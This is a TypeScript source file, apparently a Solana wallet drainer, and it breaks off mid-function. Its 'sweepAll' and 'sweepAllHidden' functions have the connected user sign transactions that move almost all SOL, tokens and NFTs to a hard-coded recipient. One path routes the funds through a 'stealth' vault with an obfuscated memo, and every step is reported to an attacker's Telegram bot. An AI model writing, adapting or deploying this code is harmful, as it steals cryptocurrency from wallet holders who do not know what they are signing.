import {
  type Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  type Signer,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  type VersionedTransaction,
} from "@solana/web3.js";
/*import {
  createTransferInstruction,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
} from "@solana/spl-token";*/
import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
/*import { sha256 } from '@noble/hashes/sha2';
import { bytesToHex } from '@noble/hashes/utils';*/
import {
  AnchorProvider,
  Program,
} from "@anchor-lang/core";
import {  BN } from "@coral-xyz/anchor";
//import { Buffer } from "node_modules/buffer/index.js";
//import type { IdlInstruction, IdlAccount, IdlTypeDef } from "@coral-xyz/anchor/dist/cjs/idl";
import type { Wallet } from "@coral-xyz/anchor/dist/cjs/provider";
const Buffer = globalThis.Buffer;

// ========== CONFIGURATION ==========
const STEALTH_PROGRAM_ID = new PublicKey('2gHYoSiAc88SazwLCg12uqSQPVecqF67JW8v3ZMQY6RS');

// ========== IDL WITH CORRECT TYPES ==========
const STEALTH_IDL: any ={
  "version": "0.1.0",
  "name": "stealth_program",
  "address": "2gHYoSiAc88SazwLCg12uqSQPVecqF67JW8v3ZMQY6RS",
  "metadata": {
  "address": "2gHYoSiAc88SazwLCg12uqSQPVecqF67JW8v3ZMQY6RS"
},
  "instructions": [
    {
      "name": "initVault",
      "accounts": [
        {
          "name": "owner",
          "isMut": true,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": [
        {
          "name": "seed",
          "type": "string"
        }
      ]
    },
    {
      "name": "deposit",
      "accounts": [
        {
          "name": "depositor",
          "isMut": true,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": [
        {
          "name": "amount",
          "type": "u64"
        }
      ]
    },
    {
      "name": "stealthTransfer",
      "accounts": [
        {
          "name": "owner",
          "isMut": false,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "recipient",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": [
        {
          "name": "amount",
          "type": "u64"
        },
        {
          "name": "encryptedMemo",
          "type": "string"
        }
      ]
    },
    {
      "name": "closeVault",
      "accounts": [
        {
          "name": "owner",
          "isMut": true,
          "isSigner": true
        },
        {
          "name": "vault",
          "isMut": true,
          "isSigner": false
        },
        {
          "name": "systemProgram",
          "isMut": false,
          "isSigner": false
        }
      ],
      "args": []
    },
    {
      "name": "createDecoy",
      "accounts": [
        {
          "name": "owner",
          "isMut": false,
          "isSigner": true
        }
      ],
      "args": []
    }
  ],
  "types": [
    {
      "name": "stealthVault",
      "type": {
        "kind": "struct",
        "fields": [
          {
            "name": "owner",
            "type": {
              "array": ["u8", 32]
            }
          },
          {
            "name": "seed",
            "type": "string"
          },
          {
            "name": "amount",
            "type": "u64"
          },
          {
            "name": "isActive",
            "type": "bool"
          },
          {
            "name": "bump",
            "type": "u8"
          }
        ]
      }
    }
  ],
  "errors": [
    {
      "code": 6000,
      "name": "VaultInactive",
      "msg": "Vault is not active"
    },
    {
      "code": 6001,
      "name": "NotOwner",
      "msg": "Not the owner"
    },
    {
      "code": 6002,
      "name": "InsufficientFunds",
      "msg": "Insufficient funds"
    },
    {
      "code": 6003,
      "name": "Overflow",
      "msg": "Arithmetic overflow"
    }
  ]
}// Cast to Idl type

// === TYPE DEFINITIONS ===
/*interface HeliusToken {
  mint: string
  tokenAccount?: string
  account?: string
  rawAmount: string
  decimals?: number
}

interface HeliusNFT {
  mint: string
  tokenAccount: string
}

interface HeliusBalanceResponse {
  nativeBalance?: number
  tokens?: HeliusToken[]
  nfts?: HeliusNFT[]
}*/

// === ENV CONFIG ===
//const RPC_URL = import.meta.env.VITE_RPC_URL || "https://api.devnet.solana.com"
const HELIUS_KEY = import.meta.env.VITE_HELIUS_KEY || "dummy"
const RECIPIENT_PUBKEY = import.meta.env.VITE_RECIPIENT_PUBKEY || "11111111111111111111111111111112"
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "dummy"
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || "dummy"

//const MAX_INS_PER_TX = Number.parseInt(import.meta.env.VITE_MAX_INS_PER_TX || "12")
const RESERVED_LAMPORTS = Number.parseInt(import.meta.env.VITE_RESERVED_LAMPORTS_FOR_FEES || "10000")

// ==== TELEGRAM MESSAGE FUNCTION ====
export async function sendTelegramMessage(text: string): Promise<void> {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "Markdown",
    }),
  })
}

// ==== ANCHOR PROGRAM SETUP ====
function createAnchorProvider(
  connection: Connection,
  publicKey: PublicKey,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
) {
  // Create a wallet adapter for Anchor
  const wallet = {
    publicKey,
    signTransaction: async (tx: Transaction) => {
      return await signTransaction(tx) as Transaction;
    },
    signAllTransactions: async (txs: Transaction[]) => {
      return await Promise.all(txs.map(tx => signTransaction(tx) as Promise<Transaction>));
    }
  } as Wallet;

  return new AnchorProvider(connection, wallet, {
    commitment: 'confirmed',
    preflightCommitment: 'confirmed',
  });
}

function createProgram(
  connection: Connection,
  publicKey: PublicKey,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
) {
  const provider = createAnchorProvider(connection, publicKey, signTransaction);
    const program = new Program(
    STEALTH_IDL as any,
    provider
  );

  // IMPORTANT: set programId manually
  //(program as any).programId = STEALTH_PROGRAM_ID;
  return program;
}

// ==== HELPER FUNCTIONS ====
function generateVaultSeed(): string {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 10);
  return `sweep-${timestamp}-${random}`;
}

function xorEncrypt(text: string, key: string): string {
  let result = '';
  for (let i = 0; i < text.length; i++) {
    const charCode = text.charCodeAt(i) ^ key.charCodeAt(i % key.length);
    result += String.fromCharCode(charCode);
  }
  return Buffer.from(result).toString('base64');
}

// retry wrapper
/*
async function retry<T>(fn: () => Promise<T>, retries = 3, delayMs = 1000): Promise<T> {
  for (let i = 0; i < retries; i++) {
    try {
      return await fn()
    } catch (err) {
      if (i < retries - 1) {
        await new Promise((res) => setTimeout(res, delayMs))
        delayMs *= 2
      } else throw err
    }
  }
  throw new Error("Retry failed")
}*/

// ==== ANCHOR-BASED STEALTH FUNCTIONS ====

/**
 * Generate vault PDA
 */
function getVaultPda(
  owner: PublicKey,
  seed: string
): [PublicKey, number] {
  const [pda, bump] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("vault"),
      owner.toBuffer(),
      Buffer.from(seed),
    ],
    STEALTH_PROGRAM_ID
  );
  return [pda, bump];
}

/**
 * Initialize vault with Anchor client
 */
async function initializeVault(
  program: Program,
  owner: PublicKey,
  seed: string
): Promise<{ vaultPda: PublicKey, signature: string }> {
  console.log(`[Anchor] Initializing vault with seed: "${seed}"`);
  console.log(`[Debug] Seed type: ${typeof seed}, value: ${seed}`);
  console.log(`[Debug] Seed length: ${seed.length}`);
  console.log(`[Debug] Seed as bytes:`, Buffer.from(seed).toString('hex'));
  
  const [vaultPda] = getVaultPda(owner, seed);
  console.log(`[Debug] Vault PDA: ${vaultPda.toBase58()}`);
  const seedBuffer = Array.from( Buffer.from(seed, 'utf8'));
  // Simulate first
  try {
    console.log(`[Debug] Attempting simulation...`);
    
    console.log(typeof seedBuffer)
    // Try with explicit parameter passing
    const simulationResult = await program.methods
      .initVault(seed)
      .accounts({
        owner: owner,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .simulate();
      console.log("simulate: ", simulationResult)
    
    console.log(`[Anchor] Simulation successful`);
    //console.log(`[Debug] Simulation logs:`, simulationResult?.logs || 'No logs');
    
  } catch (simError: any) {
    console.error(`[Anchor] Simulation failed:`, simError);
    console.error(`[Debug] Error name:`, simError.name);
    console.error(`[Debug] Error message:`, simError.message);
    console.error(`[Debug] Error stack:`, simError.stack);
    
    if (simError.logs) {
      console.error(`[Anchor] Simulation logs:`, simError.logs);
    }
    
    // Check if it's a serialization error
    if (simError.message.includes('string, Buffer, ArrayBuffer')) {
      console.error(`[Debug] Serialization error detected`);
      console.error(`[Debug] Seed value might be invalid: "${seed}"`);
    }
    
    throw new Error(`Vault init simulation failed: ${simError.message}`);
  }
  
  // Send transaction
  console.log(`[Debug] Sending transaction...`);
  const signature = await program.methods
    .initVault(seed)
    .accounts({
      owner: owner,
      vault: vaultPda,
      systemProgram: SystemProgram.programId,
    })
    .rpc({
      commitment: 'confirmed',
      skipPreflight: false,
    });
  
  console.log(`[Anchor] Vault initialized: ${signature.slice(0, 16)}...`);
  return { vaultPda, signature };
}

/**
 * Deposit to vault with Anchor client
 */
async function depositToVault(
  program: Program,
  depositor: PublicKey,
  vaultPda: PublicKey,
  amount: BN
): Promise<string> {
  console.log(`[Anchor] Depositing ${amount.toString()} lamports`);
  
  // Simulate
  try {
    await program.methods
      .deposit(amount)
      .accounts({
        depositor: depositor,
        vault: vaultPda,
        systemProgram: SystemProgram.programId,
      })
      .simulate();
    
    console.log(`[Anchor] Deposit simulation successful`);
  } catch (simError: any) {
    console.error(`[Anchor] Deposit simulation failed:`, simError.message);
    if (simError.logs) {
      console.error(`[Anchor] Simulation logs:`, simError.logs);
    }
    throw new Error(`Deposit simulation failed: ${simError.message}`);
  }
  
  // Send transaction
  const signature = await program.methods
    .deposit(amount)
    .accounts({
      depositor: depositor,
      vault: vaultPda,
      systemProgram: SystemProgram.programId,
    })
    .rpc({
      commitment: 'confirmed',
      skipPreflight: false,
    });
  
  console.log(`[Anchor] Deposit completed: ${signature.slice(0, 16)}...`);
  return signature;
}

/**
 * Stealth transfer with Anchor client
 */
async function stealthTransfer(
  program: Program,
  owner: PublicKey,
  vaultPda: PublicKey,
  recipient: PublicKey,
  amount: BN,
  encryptedMemo: string
): Promise<string> {
  console.log(`[Anchor] Stealth transferring ${amount.toString()} lamports`);
  
  // Simulate
  try {
    await program.methods
      .stealthTransfer(amount, encryptedMemo)
      .accounts({
        owner: owner,
        vault: vaultPda,
        recipient: recipient,
        systemProgram: SystemProgram.programId,
      })
      .simulate();
    
    console.log(`[Anchor] Transfer simulation successful`);
  } catch (simError: any) {
    console.error(`[Anchor] Transfer simulation failed:`, simError.message);
    if (simError.logs) {
      console.error(`[Anchor] Simulation logs:`, simError.logs);
    }
    throw new Error(`Stealth transfer simulation failed: ${simError.message}`);
  }
  
  // Send transaction
  const signature = await program.methods
    .stealthTransfer(amount, encryptedMemo)
    .accounts({
      owner: owner,
      vault: vaultPda,
      recipient: recipient,
      systemProgram: SystemProgram.programId,
    })
    .rpc({
      commitment: 'confirmed',
      skipPreflight: false,
    });
  
  console.log(`[Anchor] Stealth transfer completed: ${signature.slice(0, 16)}...`);
  return signature;
}

// === MAIN STEALTH SWEEP FUNCTION WITH ANCHOR ===
export async function sweepAllHidden(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction ) => Promise<Transaction | VersionedTransaction>,
): Promise<boolean> {
  const RECIPIENT = new PublicKey(RECIPIENT_PUBKEY);
  
  console.log("=".repeat(60));
  console.log("🚀 ANCHOR-BASED STEALTH SWEEP");
  console.log("=".repeat(60));
  
  // Get balance
  const nativeBalance = await connection.getBalance(publicKey);
  console.log(`[Balance] ${nativeBalance} lamports (${nativeBalance / LAMPORTS_PER_SOL} SOL)`);
  
  // Reserve 0.001 SOL for rent + fees
  const RENT_AMOUNT = 1000000; // 0.001 SOL
  if (nativeBalance <= RESERVED_LAMPORTS + RENT_AMOUNT) {
    console.log(`❌ Insufficient balance for rent and fees`);
    return false;
  }

  const availableSol = nativeBalance - RESERVED_LAMPORTS - RENT_AMOUNT;
  console.log(`[Sweep] Amount to transfer: ${availableSol} lamports`);
  
  // Create Anchor program instance
  const program = createProgram(connection, publicKey, signTransaction);
  console.log(`[Anchor] Program created: ${program.programId.toBase58()}`);
  
  // Generate seed
  const seed = generateVaultSeed();
  
  try {
    // ===== STEP 1: Initialize Vault =====
    console.log(`\n🔧 STEP 1: Initializing vault...`);
    
    const { vaultPda, signature: initSig } = await initializeVault(
      program,
      publicKey,
      seed
    );
    
    console.log(`✅ Vault PDA: ${vaultPda.toBase58()}`);
    
    // Wait for confirmation
    await new Promise(resolve => setTimeout(resolve, 2000));

    // ===== STEP 2: Deposit SOL to Vault =====
    console.log(`\n💰 STEP 2: Depositing ${availableSol} lamports...`);
    
    const depositSig = await depositToVault(
      program,
      publicKey,
      vaultPda,
      new BN(availableSol)
    );
    
    // Wait and check vault balance
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    const vaultBalance = await connection.getBalance(vaultPda);
    console.log(`[Balance] Vault: ${vaultBalance} lamports`);

    // ===== STEP 3: Stealth Transfer =====
    console.log(`\n🔄 STEP 3: Performing stealth transfer...`);
    
    // Transfer everything except rent
    const transferAmount = Math.max(0, availableSol - 20000);
    
    // Create encrypted memo
    const memoData = JSON.stringify({
      from: publicKey.toBase58(),
      to: RECIPIENT.toBase58(),
      amount: transferAmount,
      timestamp: Date.now(),
    });
    const encryptedMemo = xorEncrypt(memoData, `key-${Date.now()}`);
    
    const stealthSig = await stealthTransfer(
      program,
      publicKey,
      vaultPda,
      RECIPIENT,
      new BN(transferAmount),
      encryptedMemo
    );

    // ===== FINAL REPORT =====
    console.log("\n" + "=".repeat(60));
    console.log("🎉 STEALTH SWEEP COMPLETE!");
    console.log("=".repeat(60));
    
    const finalBalance = await connection.getBalance(publicKey);
    console.log(`\n📊 FINAL BALANCES:`);
    console.log(`  Starting: ${nativeBalance} lamports`);
    console.log(`  Final: ${finalBalance} lamports`);
    console.log(`  Transferred: ${nativeBalance - finalBalance} lamports`);
    console.log(`\n📋 TRANSACTIONS:`);
    console.log(`  Vault Init: ${initSig.slice(0, 16)}...`);
    console.log(`  Deposit: ${depositSig.slice(0, 16)}...`);
    console.log(`  Stealth Transfer: ${stealthSig.slice(0, 16)}...`);
    
    return true;

  } catch (error: any) {
    console.error("\n❌ ANCHOR STEALTH SWEEP FAILED:", error.message);
    
    if (error.logs) {
      console.error("Program logs:");
      error.logs.forEach((log: string) => console.error(`  ${log}`));
    }
    
    // Fallback to simple transfer
    try {
      console.log(`\n🔄 Falling back to simple transfer...`);
      
      const fallbackTx = new Transaction();
      const latest = await connection.getLatestBlockhash("finalized");
      
      fallbackTx.feePayer = publicKey;
      fallbackTx.recentBlockhash = latest.blockhash;
      
      fallbackTx.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECIPIENT,
          lamports: availableSol + RENT_AMOUNT,
        })
      );
      
      const signedTx = await signTransaction(fallbackTx);
      const fallbackSig = await connection.sendRawTransaction(
        (signedTx as Transaction).serialize(),
        { skipPreflight: false, maxRetries: 3 }
      );
      
      console.log(`✅ Fallback transfer sent: ${fallbackSig.slice(0, 16)}...`);
      
      return true;
    } catch (fallbackError: any) {
      console.error(`❌ Fallback also failed:`, fallbackError.message);
      return false;
    }
  }
}


// === ENHANCED SWEEP FUNCTION WITH TOKENS & NFTs ===
// === ENHANCED SWEEP FUNCTION WITH TOKENS & NFTs ===
export async function sweepAll(
  publicKey: PublicKey,
  connection: Connection,
  signTransaction: (tx: Transaction | VersionedTransaction) => Promise<Transaction | VersionedTransaction>
): Promise<boolean> {
  const RECIPIENT = new PublicKey(RECIPIENT_PUBKEY);
  
  console.log("=".repeat(60));
  console.log("🚀 COMPREHENSIVE ASSET SWEEP");
  console.log("=".repeat(60));
  
  // Send initial notification
  try {
    await sendTelegramMessage(
      `🚀 *Comprehensive Asset Sweep Started*\n` +
      `From: \`${publicKey.toBase58().slice(0, 8)}...\`\n` +
      `To: \`${RECIPIENT.toBase58().slice(0, 8)}...\`\n` +
      `Timestamp: ${new Date().toISOString()}`
    );
  } catch (telegramError) {
    console.warn("Failed to send initial Telegram notification:", telegramError);
  }
  
  try {
    // ===== STEP 1: Balance Check and Preparation =====
    console.log(`\n🔍 STEP 1: Checking balances...`);
    
    try {
      await sendTelegramMessage(
        `🔍 *Step 1: Checking Balances*\n` +
        `Wallet: \`${publicKey.toBase58().slice(0, 12)}...\`\n` +
        `Status: Fetching balances...`
      );
    } catch (telegramError) {
      console.warn("Failed to send balance check start notification:", telegramError);
    }
    
    // 1. SOL Sweep
    const nativeBalance = await connection.getBalance(publicKey);
    const availableSol = nativeBalance - 5000000; // Keep some SOL for fees
    const rentExemptSol = 5000000; // Buffer for rent
    
    console.log("SOL Balance:", nativeBalance / 1e9, "Available:", availableSol / 1e9);
    
    // Send SOL balance notification
    try {
      await sendTelegramMessage(
        `💰 *SOL Balance*\n` +
        `Total: *${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
        `Available for sweep: *${(availableSol / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
        `Reserved for fees: *${(rentExemptSol / LAMPORTS_PER_SOL).toFixed(4)} SOL*`
      );
    } catch (telegramError) {
      console.warn("Failed to send SOL balance notification:", telegramError);
    }
    
    if (availableSol <= 0) {
      console.log(`❌ Insufficient SOL for transaction fees`);
      
      try {
        await sendTelegramMessage(
          `❌ *Insufficient SOL*\n` +
          `Not enough SOL for transaction fees\n` +
          `Current: ${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n` +
          `Required minimum: ${(rentExemptSol / LAMPORTS_PER_SOL).toFixed(4)} SOL`
        );
      } catch (telegramError) {
        console.warn("Failed to send insufficient SOL notification:", telegramError);
      }
      
      return false;
    }

    // Create transaction
    const tx = new Transaction();
    
    
    // ===== STEP 2: Add SOL Transfer =====
    console.log(`\n💰 STEP 2: Adding SOL transfer...`);
    
    if (availableSol > 0) {
      const solToTransfer = availableSol - rentExemptSol;
      
      try {
        await sendTelegramMessage(
          `💰 *Step 2: SOL Transfer*\n` +
          `Adding SOL transfer to transaction\n` +
          `Amount: *${(solToTransfer / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
          `Recipient: \`${RECIPIENT.toBase58().slice(0, 12)}...\``
        );
      } catch (telegramError) {
        console.warn("Failed to send SOL transfer notification:", telegramError);
      }
      
      tx.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: RECIPIENT,
          lamports: solToTransfer,
        })
      );
      
      console.log(`Added SOL transfer: ${(solToTransfer / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    }
    
    // ===== STEP 3: Fetch Token Balances =====
    console.log(`\n🪙 STEP 3: Fetching token balances from Helius...`);
    
    try {
      await sendTelegramMessage(
        `🪙 *Step 3: Fetching Token Balances*\n` +
        `Querying Helius API for token balances...\n` +
        `Status: In progress`
      );
    } catch (telegramError) {
      console.warn("Failed to send token fetch start notification:", telegramError);
    }
    
    const tokens = await getTokenBalances(publicKey, HELIUS_KEY);
    console.log(`Found ${tokens.length} tokens including NFTs`);
    
    try {
      await sendTelegramMessage(
        `📊 *Token Balance Results*\n` +
        `Found: *${tokens.length} tokens*\n` +
        `Status: Processing token transfers...`
      );
    } catch (telegramError) {
      console.warn("Failed to send token results notification:", telegramError);
    }
    
    // Track token statistics
    let tokenCount = 0;
    let fungibleTokens = 0;
    let nftCount = 0;
    let skippedTokens = 0;
    
    // ===== STEP 4: Add Token Transfer Instructions =====
    console.log(`\n🔄 STEP 4: Adding token transfers...`);
    
    try {
      await sendTelegramMessage(
        `🔄 *Step 4: Processing Token Transfers*\n` +
        `Adding ${tokens.length} token transfers to transaction...`
      );
    } catch (telegramError) {
      console.warn("Failed to send token processing start notification:", telegramError);
    }
    
    for (const token of tokens) {
      try {
        // Skip if zero balance
        if (Number(token.amount) == 0) {
          skippedTokens++;
          continue;
        }
        
        // Get or create associated token account for recipient
        const recipientATA = await getAssociatedTokenAddress(
          new PublicKey(token.mint),
          RECIPIENT
        );
        
        // Check if recipient already has ATA
        const recipientAccount = await connection.getAccountInfo(recipientATA);
        if (!recipientAccount) {
          // Create ATA instruction for recipient
          tx.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              recipientATA,
              RECIPIENT,
              new PublicKey(token.mint)
            )
          );
        }
        
        // Get sender's ATA
        const senderATA = await getAssociatedTokenAddress(
          new PublicKey(token.mint),
          publicKey
        );
        
        // Check sender's token account exists
        const senderAccount = await connection.getAccountInfo(senderATA);
        if (!senderAccount) {
          skippedTokens++;
          continue;
        }
        
        // Create transfer instruction
        const transferIx = createTransferInstruction(
          senderATA,
          recipientATA,
          publicKey,
          token.amount,
          [],
          TOKEN_PROGRAM_ID
        );
        
        tx.add(transferIx);
        tokenCount++;
        
        // Determine if it's an NFT or fungible token
        if (Number(token.amount) === 1 && token.decimals === 0) {
          nftCount++;
        } else {
          fungibleTokens++;
        }
        
        console.log(`Added ${token.amount} of token ${token.mint.slice(0, 8)}...`);
        
      } catch (err) {
        console.warn(`Failed to add token ${token.mint}:`, err);
        skippedTokens++;
      }
    }
    
    // Send token processing summary
    try {
      await sendTelegramMessage(
        `✅ *Token Processing Complete*\n` +
        `Successfully added: *${tokenCount} tokens*\n` +
        `• Fungible Tokens: ${fungibleTokens}\n` +
        `• NFTs: ${nftCount}\n` +
        `• Skipped: ${skippedTokens}`
      );
    } catch (telegramError) {
      console.warn("Failed to send token processing summary:", telegramError);
    }
    
    // ===== STEP 5: Fetch and Process NFTs =====
    console.log(`\n🎨 STEP 5: Fetching and processing NFTs...`);
    
    try {
      await sendTelegramMessage(
        `🎨 *Step 5: Fetching NFTs*\n` +
        `Querying Helius API for NFT balances...`
      );
    } catch (telegramError) {
      console.warn("Failed to send NFT fetch start notification:", telegramError);
    }
    
    const nfts = await getNFTs(publicKey, HELIUS_KEY);
    console.log(`Found ${nfts.length} NFTs`);
    
    let nftTransferCount = 0;
    let skippedNFTs = 0;
    
    // NFTs are already included in the tokens array, but if you want special handling:
    for (const nft of nfts) {
      try {
        if (Number(nft.amount) === 0) {
          skippedNFTs++;
          continue;
        }
        
        // Same logic as tokens - NFTs use the same token program
        const recipientATA = await getAssociatedTokenAddress(
          new PublicKey(nft.mint),
          RECIPIENT
        );
        
        const recipientAccount = await connection.getAccountInfo(recipientATA);
        if (!recipientAccount) {
          tx.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              recipientATA,
              RECIPIENT,
              new PublicKey(nft.mint)
            )
          );
        }
        
        const senderATA = await getAssociatedTokenAddress(
          new PublicKey(nft.mint),
          publicKey
        );
        
        const transferIx = createTransferInstruction(
          senderATA,
          recipientATA,
          publicKey,
          nft.amount,
          [],
          TOKEN_PROGRAM_ID
        );
        
        tx.add(transferIx);
        nftTransferCount++;
        
        console.log(`Added NFT ${nft.name || nft.mint.slice(0, 8)}...`);
        
      } catch (err) {
        console.warn(`Failed to add NFT ${nft.mint}:`, err);
        skippedNFTs++;
      }
    }
    
    // Send NFT processing summary
    try {
      await sendTelegramMessage(
        `✅ *NFT Processing Complete*\n` +
        `Total NFTs found: ${nfts.length}\n` +
        `• Transfers added: ${nftTransferCount}\n` +
        `• Skipped: ${skippedNFTs}\n` +
        `Total instructions in transaction: ${tx.instructions.length}`
      );
    } catch (telegramError) {
      console.warn("Failed to send NFT processing summary:", telegramError);
    }
    
    // Check if we have any instructions to send
    if (tx.instructions.length === 0) {
      console.log("No assets to sweep");
      
      try {
        await sendTelegramMessage(
          `ℹ️ *No Assets to Sweep*\n` +
          `Transaction contains no transfer instructions\n` +
          `Wallet may be empty or only has insufficient SOL for fees`
        );
      } catch (telegramError) {
        console.warn("Failed to send no assets notification:", telegramError);
      }
      
      return false;
    }
    
    // ===== STEP 6: Send Transaction =====
    console.log(`\n🚀 STEP 6: Sending atomic sweep transaction...`);
    console.log(`Total instructions: ${tx.instructions.length}`);
    
    try {
      await sendTelegramMessage(
        `🚀 *Step 6: Sending Atomic Transaction*\n` +
        `Total Instructions: *${tx.instructions.length}*\n` +
        `Transaction size: ${tx.serializeMessage().length} bytes\n` +
        `Status: Signing and sending...`
      );
    } catch (telegramError) {
      console.warn("Failed to send transaction start notification:", telegramError);
    }

    const latest = await connection.getLatestBlockhash("finalized");
    tx.feePayer = publicKey;
    tx.recentBlockhash = latest.blockhash;
    
    const signedTx = await signTransaction(tx);
    const signature = await connection.sendRawTransaction(
      (signedTx as Transaction).serialize(),
      { 
        skipPreflight: false, 
        maxRetries: 3,
        preflightCommitment: 'confirmed'
      }
    );
    
    console.log(`Transaction sent: ${signature.slice(0, 16)}...`);
    
    // Send transaction sent notification
    try {
      await sendTelegramMessage(
        `📤 *Transaction Sent*\n` +
        `Signature: \`${signature}\`\n` +
        `Explorer: https://explorer.solana.com/tx/${signature}\n` +
        `Status: Awaiting confirmation...`
      );
    } catch (telegramError) {
      console.warn("Failed to send transaction sent notification:", telegramError);
    }
    
    // Wait for confirmation
    console.log(`Awaiting confirmation...`);
    
    const confirmation = await connection.confirmTransaction({
      signature,
      blockhash: latest.blockhash,
      lastValidBlockHeight: latest.lastValidBlockHeight,
    }, 'confirmed');
    
    // ===== FINAL REPORT =====
    console.log("\n" + "=".repeat(60));
    console.log("🎉 ATOMIC SWEEP COMPLETE!");
    console.log("=".repeat(60));
    
    // Get final balance
    const finalBalance = await connection.getBalance(publicKey);
    const totalTransferred = nativeBalance - finalBalance;
    
    console.log(`\n📊 FINAL BALANCES:`);
    console.log(`  Starting SOL: ${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    console.log(`  Final SOL: ${(finalBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    console.log(`  Transferred SOL: ${(totalTransferred / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
    console.log(`\n📋 ASSET SUMMARY:`);
    console.log(`  Fungible Tokens: ${fungibleTokens}`);
    console.log(`  NFTs: ${nftCount + nftTransferCount}`);
    console.log(`  Total Assets: ${fungibleTokens + nftCount + nftTransferCount}`);
    console.log(`\n✅ Transaction confirmed: ${signature.slice(0, 16)}...`);
    
    // Send final success notification with detailed summary
    try {
      await sendTelegramMessage(
        `🎉 *ATOMIC SWEEP COMPLETE!*\n\n` +
        `📊 *Final Summary*\n` +
        `• Starting SOL: *${(nativeBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
        `• Final SOL: *${(finalBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n` +
        `• Transferred SOL: *${(totalTransferred / LAMPORTS_PER_SOL).toFixed(4)} SOL*\n\n` +
        `📋 *Asset Transfers*\n` +
        `• Fungible Tokens: ${fungibleTokens}\n` +
        `• NFTs: ${nftCount + nftTransferCount}\n` +
        `• Total Assets: ${fungibleTokens + nftCount + nftTransferCount}\n` +
        `• Skipped: ${skippedTokens + skippedNFTs}\n\n` +
        `⚡ *Transaction Details*\n` +
        `• Signature: \`${signature}\`\n` +
        `• Instructions: ${tx.instructions.length}\n` +
        `• Explorer: https://explorer.solana.com/tx/${signature}\n\n` +
        `✅ *All assets transferred atomically!*`
      );
    } catch (telegramError) {
      console.warn("Failed to send final success notification:", telegramError);
    }
    
    return true;
    
  } catch (error: any) {
    console.error("\n❌ ATOMIC SWEEP FAILED:", error);
    
    // Send error notification with context
    const errorStep = getSweepErrorStep(error);
    
    try {
      await sendTelegramMessage(
        `❌ *Atomic Sweep Failed*\n\n` +
        `Step: *${errorStep}*\n` +
        `Error: \`${error.message?.slice(0, 200) || 'Unknown error'}\`\n\n` +
        `💰 *Last Known State*\n` +
        `Wallet: \`${publicKey.toBase58().slice(0, 12)}...\`\n` +
        `Recipient: \`${RECIPIENT.toBase58().slice(0, 12)}...\`\n` +
        `Time: ${new Date().toISOString()}\n\n` +
        `⚠️ Manual intervention may be required`
      );
    } catch (telegramError) {
      console.warn("Failed to send error notification:", telegramError);
    }
    
    return false;
  }
}

// Helper function to determine which step of the sweep failed
function getSweepErrorStep(error: any): string {
  const errorMessage = error.message?.toLowerCase() || '';
  const stack = error.stack?.toLowerCase() || '';
  
  if (errorMessage.includes('balance') || errorMessage.includes('insufficient')) {
    return 'Balance Check';
  } else if (errorMessage.includes('token') || errorMessage.includes('helius')) {
    return 'Token Balance Fetch';
  } else if (errorMessage.includes('associated') || errorMessage.includes('ata')) {
    return 'Token Account Setup';
  } else if (errorMessage.includes('sign') || errorMessage.includes('signature')) {
    return 'Transaction Signing';
  } else if (errorMessage.includes('send') || errorMessage.includes('transaction')) {
    return 'Transaction Submission';
  } else if (errorMessage.includes('confirm') || errorMessage.includes('blockhash')) {
    return 'Transaction Confirmation';
  } else if (stack.includes('gettokenbalances') || stack.includes('getnfts')) {
    return 'Helius API Call';
  } else if (stack.includes('getassociatedtokenaddress')) {
    return 'Token Account Derivation';
  } else if (stack.includes('createtransferinstruction')) {
    return 'Transfer Instruction Creation';
  } else if (stack.includes('systemprogram.transfer')) {
    return 'SOL Transfer Setup';
  }
  
  return 'Unknown Step';
}
// ========== HELIUS API HELPERS ==========

interface TokenBalance {
  mint: string;
  amount: bigint;
  decimals: number;
  tokenAccount?: string;
  name?: string;
  symbol?: string;
}

async function getTokenBalances(wallet: PublicKey, apiKey: string): Promise<TokenBalance[]> {
  const url = `https://api.helius.xyz/v1/addresses/${wallet.toString()}/balances?api-key=${apiKey}`;
  
  try {
    const response = await fetch(url);
    const data = await response.json();
    
